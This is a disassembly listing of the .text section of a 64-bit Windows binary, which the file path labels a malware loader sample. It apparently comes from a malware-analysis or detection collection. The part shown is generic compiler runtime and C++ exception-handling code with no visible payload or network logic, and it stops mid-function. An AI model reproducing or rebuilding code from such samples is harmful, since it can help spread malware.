
malware_samples/loader/59c4d41c48140efa58c4c18c67fb484b937d37cdd774583e02bcc93722ab0603.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 0d e9 e8 03 00 	lea    0x3e8e9(%rip),%rcx        # 0x18003f8f0
   180001007:	e9 fc 6c 01 00       	jmp    0x180017d08
   18000100c:	cc                   	int3
   18000100d:	cc                   	int3
   18000100e:	cc                   	int3
   18000100f:	cc                   	int3
   180001010:	48 8d 0d 49 e9 03 00 	lea    0x3e949(%rip),%rcx        # 0x18003f960
   180001017:	e9 ec 6c 01 00       	jmp    0x180017d08
   18000101c:	cc                   	int3
   18000101d:	cc                   	int3
   18000101e:	cc                   	int3
   18000101f:	cc                   	int3
   180001020:	48 8d 0d a9 e9 03 00 	lea    0x3e9a9(%rip),%rcx        # 0x18003f9d0
   180001027:	e9 dc 6c 01 00       	jmp    0x180017d08
   18000102c:	48 83 ec 28          	sub    $0x28,%rsp
   180001030:	48 8d 0d 79 74 05 00 	lea    0x57479(%rip),%rcx        # 0x1800584b0
   180001037:	e8 b0 51 01 00       	call   0x1800161ec
   18000103c:	48 8d 0d f9 e9 03 00 	lea    0x3e9f9(%rip),%rcx        # 0x18003fa3c
   180001043:	48 83 c4 28          	add    $0x28,%rsp
   180001047:	e9 bc 6c 01 00       	jmp    0x180017d08
   18000104c:	48 8d 0d 51 ea 03 00 	lea    0x3ea51(%rip),%rcx        # 0x18003faa4
   180001053:	e9 b0 6c 01 00       	jmp    0x180017d08
   180001058:	48 8d 0d e9 e9 03 00 	lea    0x3e9e9(%rip),%rcx        # 0x18003fa48
   18000105f:	e9 a4 6c 01 00       	jmp    0x180017d08
   180001064:	48 83 ec 28          	sub    $0x28,%rsp
   180001068:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000106e:	48 8d 15 eb 76 05 00 	lea    0x576eb(%rip),%rdx        # 0x180058760
   180001075:	45 33 c0             	xor    %r8d,%r8d
   180001078:	48 8d 0d 71 76 05 00 	lea    0x57671(%rip),%rcx        # 0x1800586f0
   18000107f:	e8 cc c5 00 00       	call   0x18000d650
   180001084:	48 8d 0d 59 ea 03 00 	lea    0x3ea59(%rip),%rcx        # 0x18003fae4
   18000108b:	48 83 c4 28          	add    $0x28,%rsp
   18000108f:	e9 74 6c 01 00       	jmp    0x180017d08
   180001094:	40 53                	rex push %rbx
   180001096:	48 83 ec 20          	sub    $0x20,%rsp
   18000109a:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000109f:	e8 38 4d 02 00       	call   0x180025ddc
   1800010a4:	48 8d 0d b5 76 05 00 	lea    0x576b5(%rip),%rcx        # 0x180058760
   1800010ab:	48 8b d8             	mov    %rax,%rbx
   1800010ae:	e8 5d d8 00 00       	call   0x18000e910
   1800010b3:	48 8d 05 0e 05 04 00 	lea    0x4050e(%rip),%rax        # 0x1800415c8
   1800010ba:	45 33 c0             	xor    %r8d,%r8d
   1800010bd:	48 8b d3             	mov    %rbx,%rdx
   1800010c0:	48 89 05 99 76 05 00 	mov    %rax,0x57699(%rip)        # 0x180058760
   1800010c7:	48 8d 0d 92 76 05 00 	lea    0x57692(%rip),%rcx        # 0x180058760
   1800010ce:	e8 1d c0 00 00       	call   0x18000d0f0
   1800010d3:	48 8d 0d 5e ea 03 00 	lea    0x3ea5e(%rip),%rcx        # 0x18003fb38
   1800010da:	48 83 c4 20          	add    $0x20,%rsp
   1800010de:	5b                   	pop    %rbx
   1800010df:	e9 24 6c 01 00       	jmp    0x180017d08
   1800010e4:	48 8b 15 45 78 05 00 	mov    0x57845(%rip),%rdx        # 0x180058930
   1800010eb:	4c 8d 05 fe 75 05 00 	lea    0x575fe(%rip),%r8        # 0x1800586f0
   1800010f2:	4c 89 05 3f 78 05 00 	mov    %r8,0x5783f(%rip)        # 0x180058938
   1800010f9:	48 85 d2             	test   %rdx,%rdx
   1800010fc:	74 13                	je     0x180001111
   1800010fe:	48 8b 02             	mov    (%rdx),%rax
   180001101:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180001105:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   18000110a:	4c 8b 05 27 78 05 00 	mov    0x57827(%rip),%r8        # 0x180058938
   180001111:	48 8b 15 28 78 05 00 	mov    0x57828(%rip),%rdx        # 0x180058940
   180001118:	48 85 d2             	test   %rdx,%rdx
   18000111b:	74 0c                	je     0x180001129
   18000111d:	48 8b 02             	mov    (%rdx),%rax
   180001120:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180001124:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   180001129:	c3                   	ret
   18000112a:	cc                   	int3
   18000112b:	cc                   	int3
   18000112c:	48 83 ec 28          	sub    $0x28,%rsp
   180001130:	48 8d 0d a9 75 05 00 	lea    0x575a9(%rip),%rcx        # 0x1800586e0
   180001137:	e8 b0 50 01 00       	call   0x1800161ec
   18000113c:	48 8d 0d 01 ea 03 00 	lea    0x3ea01(%rip),%rcx        # 0x18003fb44
   180001143:	48 83 c4 28          	add    $0x28,%rsp
   180001147:	e9 bc 6b 01 00       	jmp    0x180017d08
   18000114c:	48 83 ec 28          	sub    $0x28,%rsp
   180001150:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180001156:	48 8d 15 b3 76 05 00 	lea    0x576b3(%rip),%rdx        # 0x180058810
   18000115d:	45 33 c0             	xor    %r8d,%r8d
   180001160:	48 8d 0d 49 77 05 00 	lea    0x57749(%rip),%rcx        # 0x1800588b0
   180001167:	e8 54 c4 00 00       	call   0x18000d5c0
   18000116c:	48 8d 0d dd e9 03 00 	lea    0x3e9dd(%rip),%rcx        # 0x18003fb50
   180001173:	48 83 c4 28          	add    $0x28,%rsp
   180001177:	e9 8c 6b 01 00       	jmp    0x180017d08
   18000117c:	40 53                	rex push %rbx
   18000117e:	48 83 ec 20          	sub    $0x20,%rsp
   180001182:	33 c9                	xor    %ecx,%ecx
   180001184:	e8 53 4c 02 00       	call   0x180025ddc
   180001189:	48 8d 0d 80 76 05 00 	lea    0x57680(%rip),%rcx        # 0x180058810
   180001190:	48 8b d8             	mov    %rax,%rbx
   180001193:	e8 78 d7 00 00       	call   0x18000e910
   180001198:	48 8d 05 29 04 04 00 	lea    0x40429(%rip),%rax        # 0x1800415c8
   18000119f:	45 33 c0             	xor    %r8d,%r8d
   1800011a2:	48 8b d3             	mov    %rbx,%rdx
   1800011a5:	48 89 05 64 76 05 00 	mov    %rax,0x57664(%rip)        # 0x180058810
   1800011ac:	48 8d 0d 5d 76 05 00 	lea    0x5765d(%rip),%rcx        # 0x180058810
   1800011b3:	e8 38 bf 00 00       	call   0x18000d0f0
   1800011b8:	48 8d 0d e5 e9 03 00 	lea    0x3e9e5(%rip),%rcx        # 0x18003fba4
   1800011bf:	48 83 c4 20          	add    $0x20,%rsp
   1800011c3:	5b                   	pop    %rbx
   1800011c4:	e9 3f 6b 01 00       	jmp    0x180017d08
   1800011c9:	cc                   	int3
   1800011ca:	cc                   	int3
   1800011cb:	cc                   	int3
   1800011cc:	48 8b 05 dd 76 05 00 	mov    0x576dd(%rip),%rax        # 0x1800588b0
   1800011d3:	48 8d 15 d6 76 05 00 	lea    0x576d6(%rip),%rdx        # 0x1800588b0
   1800011da:	48 89 15 4f 77 05 00 	mov    %rdx,0x5774f(%rip)        # 0x180058930
   1800011e1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800011e5:	48 8b 05 4c 77 05 00 	mov    0x5774c(%rip),%rax        # 0x180058938
   1800011ec:	48 89 44 11 50       	mov    %rax,0x50(%rcx,%rdx,1)
   1800011f1:	c3                   	ret
   1800011f2:	cc                   	int3
   1800011f3:	cc                   	int3
   1800011f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800011f8:	48 8d 0d 01 76 05 00 	lea    0x57601(%rip),%rcx        # 0x180058800
   1800011ff:	e8 e8 4f 01 00       	call   0x1800161ec
   180001204:	48 8d 0d a5 e9 03 00 	lea    0x3e9a5(%rip),%rcx        # 0x18003fbb0
   18000120b:	48 83 c4 28          	add    $0x28,%rsp
   18000120f:	e9 f4 6a 01 00       	jmp    0x180017d08
   180001214:	48 83 ec 28          	sub    $0x28,%rsp
   180001218:	48 8d 0d 51 77 05 00 	lea    0x57751(%rip),%rcx        # 0x180058970
   18000121f:	e8 c8 4f 01 00       	call   0x1800161ec
   180001224:	48 8d 0d d1 e9 03 00 	lea    0x3e9d1(%rip),%rcx        # 0x18003fbfc
   18000122b:	48 83 c4 28          	add    $0x28,%rsp
   18000122f:	e9 d4 6a 01 00       	jmp    0x180017d08
   180001234:	48 8d 0d 81 e9 03 00 	lea    0x3e981(%rip),%rcx        # 0x18003fbbc
   18000123b:	e9 c8 6a 01 00       	jmp    0x180017d08
   180001240:	48 8d 05 a1 8b 05 00 	lea    0x58ba1(%rip),%rax        # 0x180059de8
   180001247:	c3                   	ret
   180001248:	cc                   	int3
   180001249:	cc                   	int3
   18000124a:	cc                   	int3
   18000124b:	cc                   	int3
   18000124c:	cc                   	int3
   18000124d:	cc                   	int3
   18000124e:	cc                   	int3
   18000124f:	cc                   	int3
   180001250:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001255:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000125a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000125f:	53                   	push   %rbx
   180001260:	56                   	push   %rsi
   180001261:	57                   	push   %rdi
   180001262:	48 83 ec 30          	sub    $0x30,%rsp
   180001266:	48 8b fa             	mov    %rdx,%rdi
   180001269:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   18000126e:	48 8b d9             	mov    %rcx,%rbx
   180001271:	e8 ca ff ff ff       	call   0x180001240
   180001276:	45 33 c9             	xor    %r9d,%r9d
   180001279:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000127e:	4c 8b c7             	mov    %rdi,%r8
   180001281:	48 8b d3             	mov    %rbx,%rdx
   180001284:	48 8b 08             	mov    (%rax),%rcx
   180001287:	e8 3c ef 01 00       	call   0x1800201c8
   18000128c:	48 83 c4 30          	add    $0x30,%rsp
   180001290:	5f                   	pop    %rdi
   180001291:	5e                   	pop    %rsi
   180001292:	5b                   	pop    %rbx
   180001293:	c3                   	ret
   180001294:	cc                   	int3
   180001295:	cc                   	int3
   180001296:	cc                   	int3
   180001297:	cc                   	int3
   180001298:	cc                   	int3
   180001299:	cc                   	int3
   18000129a:	cc                   	int3
   18000129b:	cc                   	int3
   18000129c:	cc                   	int3
   18000129d:	cc                   	int3
   18000129e:	cc                   	int3
   18000129f:	cc                   	int3
   1800012a0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800012a5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800012aa:	53                   	push   %rbx
   1800012ab:	55                   	push   %rbp
   1800012ac:	56                   	push   %rsi
   1800012ad:	57                   	push   %rdi
   1800012ae:	48 83 ec 38          	sub    $0x38,%rsp
   1800012b2:	49 8b f0             	mov    %r8,%rsi
   1800012b5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1800012ba:	48 8b fa             	mov    %rdx,%rdi
   1800012bd:	48 8b d9             	mov    %rcx,%rbx
   1800012c0:	e8 7b ff ff ff       	call   0x180001240
   1800012c5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1800012ca:	4c 8b ce             	mov    %rsi,%r9
   1800012cd:	4c 8b c7             	mov    %rdi,%r8
   1800012d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800012d7:	00 00 
   1800012d9:	48 8b d3             	mov    %rbx,%rdx
   1800012dc:	48 8b 08             	mov    (%rax),%rcx
   1800012df:	e8 70 ef 01 00       	call   0x180020254
   1800012e4:	85 c0                	test   %eax,%eax
   1800012e6:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1800012eb:	0f 48 c1             	cmovs  %ecx,%eax
   1800012ee:	48 83 c4 38          	add    $0x38,%rsp
   1800012f2:	5f                   	pop    %rdi
   1800012f3:	5e                   	pop    %rsi
   1800012f4:	5d                   	pop    %rbp
   1800012f5:	5b                   	pop    %rbx
   1800012f6:	c3                   	ret
   1800012f7:	cc                   	int3
   1800012f8:	cc                   	int3
   1800012f9:	cc                   	int3
   1800012fa:	cc                   	int3
   1800012fb:	cc                   	int3
   1800012fc:	cc                   	int3
   1800012fd:	cc                   	int3
   1800012fe:	cc                   	int3
   1800012ff:	cc                   	int3
   180001300:	40 53                	rex push %rbx
   180001302:	48 83 ec 20          	sub    $0x20,%rsp
   180001306:	48 8b d9             	mov    %rcx,%rbx
   180001309:	48 8b c2             	mov    %rdx,%rax
   18000130c:	48 8d 0d 05 f2 03 00 	lea    0x3f205(%rip),%rcx        # 0x180040518
   180001313:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001316:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000131a:	48 89 0b             	mov    %rcx,(%rbx)
   18000131d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001321:	0f 11 02             	movups %xmm0,(%rdx)
   180001324:	e8 c3 83 01 00       	call   0x1800196ec
   180001329:	48 8b c3             	mov    %rbx,%rax
   18000132c:	48 83 c4 20          	add    $0x20,%rsp
   180001330:	5b                   	pop    %rbx
   180001331:	c3                   	ret
   180001332:	cc                   	int3
   180001333:	cc                   	int3
   180001334:	cc                   	int3
   180001335:	cc                   	int3
   180001336:	cc                   	int3
   180001337:	cc                   	int3
   180001338:	cc                   	int3
   180001339:	cc                   	int3
   18000133a:	cc                   	int3
   18000133b:	cc                   	int3
   18000133c:	cc                   	int3
   18000133d:	cc                   	int3
   18000133e:	cc                   	int3
   18000133f:	cc                   	int3
   180001340:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001344:	48 8d 05 1d de 04 00 	lea    0x4de1d(%rip),%rax        # 0x18004f168
   18000134b:	48 85 d2             	test   %rdx,%rdx
   18000134e:	48 0f 45 c2          	cmovne %rdx,%rax
   180001352:	c3                   	ret
   180001353:	cc                   	int3
   180001354:	cc                   	int3
   180001355:	cc                   	int3
   180001356:	cc                   	int3
   180001357:	cc                   	int3
   180001358:	cc                   	int3
   180001359:	cc                   	int3
   18000135a:	cc                   	int3
   18000135b:	cc                   	int3
   18000135c:	cc                   	int3
   18000135d:	cc                   	int3
   18000135e:	cc                   	int3
   18000135f:	cc                   	int3
   180001360:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001365:	57                   	push   %rdi
   180001366:	48 83 ec 20          	sub    $0x20,%rsp
   18000136a:	48 8d 05 a7 f1 03 00 	lea    0x3f1a7(%rip),%rax        # 0x180040518
   180001371:	48 8b f9             	mov    %rcx,%rdi
   180001374:	48 89 01             	mov    %rax,(%rcx)
   180001377:	8b da                	mov    %edx,%ebx
   180001379:	48 83 c1 08          	add    $0x8,%rcx
   18000137d:	e8 fa 83 01 00       	call   0x18001977c
   180001382:	f6 c3 01             	test   $0x1,%bl
   180001385:	74 0d                	je     0x180001394
   180001387:	ba 18 00 00 00       	mov    $0x18,%edx
   18000138c:	48 8b cf             	mov    %rdi,%rcx
   18000138f:	e8 9c 65 01 00       	call   0x180017930
   180001394:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001399:	48 8b c7             	mov    %rdi,%rax
   18000139c:	48 83 c4 20          	add    $0x20,%rsp
   1800013a0:	5f                   	pop    %rdi
   1800013a1:	c3                   	ret
   1800013a2:	cc                   	int3
   1800013a3:	cc                   	int3
   1800013a4:	cc                   	int3
   1800013a5:	cc                   	int3
   1800013a6:	cc                   	int3
   1800013a7:	cc                   	int3
   1800013a8:	cc                   	int3
   1800013a9:	cc                   	int3
   1800013aa:	cc                   	int3
   1800013ab:	cc                   	int3
   1800013ac:	cc                   	int3
   1800013ad:	cc                   	int3
   1800013ae:	cc                   	int3
   1800013af:	cc                   	int3
   1800013b0:	48 8d 05 61 f1 03 00 	lea    0x3f161(%rip),%rax        # 0x180040518
   1800013b7:	48 89 01             	mov    %rax,(%rcx)
   1800013ba:	48 83 c1 08          	add    $0x8,%rcx
   1800013be:	e9 b9 83 01 00       	jmp    0x18001977c
   1800013c3:	cc                   	int3
   1800013c4:	cc                   	int3
   1800013c5:	cc                   	int3
   1800013c6:	cc                   	int3
   1800013c7:	cc                   	int3
   1800013c8:	cc                   	int3
   1800013c9:	cc                   	int3
   1800013ca:	cc                   	int3
   1800013cb:	cc                   	int3
   1800013cc:	cc                   	int3
   1800013cd:	cc                   	int3
   1800013ce:	cc                   	int3
   1800013cf:	cc                   	int3
   1800013d0:	48 8d 05 a9 dd 04 00 	lea    0x4dda9(%rip),%rax        # 0x18004f180
   1800013d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1800013de:	00 
   1800013df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800013e3:	48 8d 05 3e 00 04 00 	lea    0x4003e(%rip),%rax        # 0x180041428
   1800013ea:	48 89 01             	mov    %rax,(%rcx)
   1800013ed:	48 8b c1             	mov    %rcx,%rax
   1800013f0:	c3                   	ret
   1800013f1:	cc                   	int3
   1800013f2:	cc                   	int3
   1800013f3:	cc                   	int3
   1800013f4:	cc                   	int3
   1800013f5:	cc                   	int3
   1800013f6:	cc                   	int3
   1800013f7:	cc                   	int3
   1800013f8:	cc                   	int3
   1800013f9:	cc                   	int3
   1800013fa:	cc                   	int3
   1800013fb:	cc                   	int3
   1800013fc:	cc                   	int3
   1800013fd:	cc                   	int3
   1800013fe:	cc                   	int3
   1800013ff:	cc                   	int3
   180001400:	48 83 ec 48          	sub    $0x48,%rsp
   180001404:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001409:	e8 c2 ff ff ff       	call   0x1800013d0
   18000140e:	48 8d 15 e3 46 05 00 	lea    0x546e3(%rip),%rdx        # 0x180055af8
   180001415:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000141a:	e8 ad 83 01 00       	call   0x1800197cc
   18000141f:	cc                   	int3
   180001420:	40 53                	rex push %rbx
   180001422:	48 83 ec 20          	sub    $0x20,%rsp
   180001426:	48 8b d9             	mov    %rcx,%rbx
   180001429:	48 8b c2             	mov    %rdx,%rax
   18000142c:	48 8d 0d e5 f0 03 00 	lea    0x3f0e5(%rip),%rcx        # 0x180040518
   180001433:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001436:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000143a:	48 89 0b             	mov    %rcx,(%rbx)
   18000143d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001441:	0f 11 02             	movups %xmm0,(%rdx)
   180001444:	e8 a3 82 01 00       	call   0x1800196ec
   180001449:	48 8d 05 d8 ff 03 00 	lea    0x3ffd8(%rip),%rax        # 0x180041428
   180001450:	48 89 03             	mov    %rax,(%rbx)
   180001453:	48 8b c3             	mov    %rbx,%rax
   180001456:	48 83 c4 20          	add    $0x20,%rsp
   18000145a:	5b                   	pop    %rbx
   18000145b:	c3                   	ret
   18000145c:	cc                   	int3
   18000145d:	cc                   	int3
   18000145e:	cc                   	int3
   18000145f:	cc                   	int3
   180001460:	40 53                	rex push %rbx
   180001462:	48 83 ec 20          	sub    $0x20,%rsp
   180001466:	48 8b d9             	mov    %rcx,%rbx
   180001469:	48 8b c2             	mov    %rdx,%rax
   18000146c:	48 8d 0d a5 f0 03 00 	lea    0x3f0a5(%rip),%rcx        # 0x180040518
   180001473:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001476:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000147a:	48 89 0b             	mov    %rcx,(%rbx)
   18000147d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001481:	0f 11 02             	movups %xmm0,(%rdx)
   180001484:	e8 63 82 01 00       	call   0x1800196ec
   180001489:	48 8d 05 a0 f0 03 00 	lea    0x3f0a0(%rip),%rax        # 0x180040530
   180001490:	48 89 03             	mov    %rax,(%rbx)
   180001493:	48 8b c3             	mov    %rbx,%rax
   180001496:	48 83 c4 20          	add    $0x20,%rsp
   18000149a:	5b                   	pop    %rbx
   18000149b:	c3                   	ret
   18000149c:	cc                   	int3
   18000149d:	cc                   	int3
   18000149e:	cc                   	int3
   18000149f:	cc                   	int3
   1800014a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800014a4:	48 8d 0d ed dc 04 00 	lea    0x4dced(%rip),%rcx        # 0x18004f198
   1800014ab:	e8 f8 4f 01 00       	call   0x1800164a8
   1800014b0:	cc                   	int3
   1800014b1:	cc                   	int3
   1800014b2:	cc                   	int3
   1800014b3:	cc                   	int3
   1800014b4:	cc                   	int3
   1800014b5:	cc                   	int3
   1800014b6:	cc                   	int3
   1800014b7:	cc                   	int3
   1800014b8:	cc                   	int3
   1800014b9:	cc                   	int3
   1800014ba:	cc                   	int3
   1800014bb:	cc                   	int3
   1800014bc:	cc                   	int3
   1800014bd:	cc                   	int3
   1800014be:	cc                   	int3
   1800014bf:	cc                   	int3
   1800014c0:	40 53                	rex push %rbx
   1800014c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800014c6:	48 8b d9             	mov    %rcx,%rbx
   1800014c9:	48 8b c2             	mov    %rdx,%rax
   1800014cc:	48 8d 0d 45 f0 03 00 	lea    0x3f045(%rip),%rcx        # 0x180040518
   1800014d3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800014d6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800014da:	48 89 0b             	mov    %rcx,(%rbx)
   1800014dd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800014e1:	0f 11 02             	movups %xmm0,(%rdx)
   1800014e4:	e8 03 82 01 00       	call   0x1800196ec
   1800014e9:	48 8d 05 b0 f0 03 00 	lea    0x3f0b0(%rip),%rax        # 0x1800405a0
   1800014f0:	48 89 03             	mov    %rax,(%rbx)
   1800014f3:	48 8b c3             	mov    %rbx,%rax
   1800014f6:	48 83 c4 20          	add    $0x20,%rsp
   1800014fa:	5b                   	pop    %rbx
   1800014fb:	c3                   	ret
   1800014fc:	cc                   	int3
   1800014fd:	cc                   	int3
   1800014fe:	cc                   	int3
   1800014ff:	cc                   	int3
   180001500:	44 89 02             	mov    %r8d,(%rdx)
   180001503:	48 8b c2             	mov    %rdx,%rax
   180001506:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   18000150a:	c3                   	ret
   18000150b:	cc                   	int3
   18000150c:	cc                   	int3
   18000150d:	cc                   	int3
   18000150e:	cc                   	int3
   18000150f:	cc                   	int3
   180001510:	40 53                	rex push %rbx
   180001512:	48 83 ec 30          	sub    $0x30,%rsp
   180001516:	48 8b 01             	mov    (%rcx),%rax
   180001519:	49 8b d8             	mov    %r8,%rbx
   18000151c:	44 8b c2             	mov    %edx,%r8d
   18000151f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180001524:	ff 50 18             	call   *0x18(%rax)
   180001527:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000152b:	4c 8b 48 08          	mov    0x8(%rax),%r9
   18000152f:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001533:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   180001537:	75 0e                	jne    0x180001547
   180001539:	8b 0b                	mov    (%rbx),%ecx
   18000153b:	39 08                	cmp    %ecx,(%rax)
   18000153d:	75 08                	jne    0x180001547
   18000153f:	b0 01                	mov    $0x1,%al
   180001541:	48 83 c4 30          	add    $0x30,%rsp
   180001545:	5b                   	pop    %rbx
   180001546:	c3                   	ret
   180001547:	32 c0                	xor    %al,%al
   180001549:	48 83 c4 30          	add    $0x30,%rsp
   18000154d:	5b                   	pop    %rbx
   18000154e:	c3                   	ret
   18000154f:	cc                   	int3
   180001550:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001554:	4c 8b 48 08          	mov    0x8(%rax),%r9
   180001558:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   18000155c:	75 08                	jne    0x180001566
   18000155e:	44 39 02             	cmp    %r8d,(%rdx)
   180001561:	75 03                	jne    0x180001566
   180001563:	b0 01                	mov    $0x1,%al
   180001565:	c3                   	ret
   180001566:	32 c0                	xor    %al,%al
   180001568:	c3                   	ret
   180001569:	cc                   	int3
   18000156a:	cc                   	int3
   18000156b:	cc                   	int3
   18000156c:	cc                   	int3
   18000156d:	cc                   	int3
   18000156e:	cc                   	int3
   18000156f:	cc                   	int3
   180001570:	48 8d 05 e9 66 05 00 	lea    0x566e9(%rip),%rax        # 0x180057c60
   180001577:	89 11                	mov    %edx,(%rcx)
   180001579:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000157d:	48 8b c1             	mov    %rcx,%rax
   180001580:	c3                   	ret
   180001581:	cc                   	int3
   180001582:	cc                   	int3
   180001583:	cc                   	int3
   180001584:	cc                   	int3
   180001585:	cc                   	int3
   180001586:	cc                   	int3
   180001587:	cc                   	int3
   180001588:	cc                   	int3
   180001589:	cc                   	int3
   18000158a:	cc                   	int3
   18000158b:	cc                   	int3
   18000158c:	cc                   	int3
   18000158d:	cc                   	int3
   18000158e:	cc                   	int3
   18000158f:	cc                   	int3
   180001590:	40 55                	rex push %rbp
   180001592:	53                   	push   %rbx
   180001593:	56                   	push   %rsi
   180001594:	57                   	push   %rdi
   180001595:	41 56                	push   %r14
   180001597:	48 8d 6c 24 c9       	lea    -0x37(%rsp),%rbp
   18000159c:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1800015a3:	48 8b 05 ae 5a 05 00 	mov    0x55aae(%rip),%rax        # 0x180057058
   1800015aa:	48 33 c4             	xor    %rsp,%rax
   1800015ad:	48 89 45 27          	mov    %rax,0x27(%rbp)
   1800015b1:	48 8b f2             	mov    %rdx,%rsi
   1800015b4:	48 8b d9             	mov    %rcx,%rbx
   1800015b7:	48 89 4d b7          	mov    %rcx,-0x49(%rbp)
   1800015bb:	45 33 f6             	xor    %r14d,%r14d
   1800015be:	49 8b d0             	mov    %r8,%rdx
   1800015c1:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   1800015c5:	e8 16 a6 00 00       	call   0x18000bbe0
   1800015ca:	48 8b f8             	mov    %rax,%rdi
   1800015cd:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1800015d1:	0f 10 06             	movups (%rsi),%xmm0
   1800015d4:	0f 29 45 07          	movaps %xmm0,0x7(%rbp)
   1800015d8:	4c 39 70 10          	cmp    %r14,0x10(%rax)
   1800015dc:	74 13                	je     0x1800015f1
   1800015de:	45 8d 46 02          	lea    0x2(%r14),%r8d
   1800015e2:	48 8d 15 bf db 04 00 	lea    0x4dbbf(%rip),%rdx        # 0x18004f1a8
   1800015e9:	48 8b c8             	mov    %rax,%rcx
   1800015ec:	e8 0f c4 00 00       	call   0x18000da00
   1800015f1:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   1800015f5:	48 8b 01             	mov    (%rcx),%rax
   1800015f8:	44 8b 45 07          	mov    0x7(%rbp),%r8d
   1800015fc:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   180001600:	ff 50 10             	call   *0x10(%rax)
   180001603:	90                   	nop
   180001604:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   180001608:	48 83 7d 1f 10       	cmpq   $0x10,0x1f(%rbp)
   18000160d:	48 0f 43 55 07       	cmovae 0x7(%rbp),%rdx
   180001612:	4c 8b 45 17          	mov    0x17(%rbp),%r8
   180001616:	48 8b cf             	mov    %rdi,%rcx
   180001619:	e8 e2 c3 00 00       	call   0x18000da00
   18000161e:	90                   	nop
   18000161f:	48 8b 55 1f          	mov    0x1f(%rbp),%rdx
   180001623:	48 83 fa 10          	cmp    $0x10,%rdx
   180001627:	72 31                	jb     0x18000165a
   180001629:	48 ff c2             	inc    %rdx
   18000162c:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   180001630:	48 8b c1             	mov    %rcx,%rax
   180001633:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000163a:	72 19                	jb     0x180001655
   18000163c:	48 83 c2 27          	add    $0x27,%rdx
   180001640:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001644:	48 2b c1             	sub    %rcx,%rax
   180001647:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   18000164b:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000164f:	0f 87 d7 00 00 00    	ja     0x18000172c
   180001655:	e8 d6 62 01 00       	call   0x180017930
   18000165a:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   18000165e:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   180001662:	4c 89 75 d7          	mov    %r14,-0x29(%rbp)
   180001666:	0f 10 07             	movups (%rdi),%xmm0
   180001669:	0f 11 45 bf          	movups %xmm0,-0x41(%rbp)
   18000166d:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   180001671:	0f 11 4d cf          	movups %xmm1,-0x31(%rbp)
   180001675:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   180001679:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   180001680:	00 
   180001681:	c6 07 00             	movb   $0x0,(%rdi)
   180001684:	48 8d 45 bf          	lea    -0x41(%rbp),%rax
   180001688:	48 83 7d d7 10       	cmpq   $0x10,-0x29(%rbp)
   18000168d:	48 0f 43 45 bf       	cmovae -0x41(%rbp),%rax
   180001692:	48 8d 0d 7f ee 03 00 	lea    0x3ee7f(%rip),%rcx        # 0x180040518
   180001699:	48 89 0b             	mov    %rcx,(%rbx)
   18000169c:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800016a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800016a3:	0f 11 02             	movups %xmm0,(%rdx)
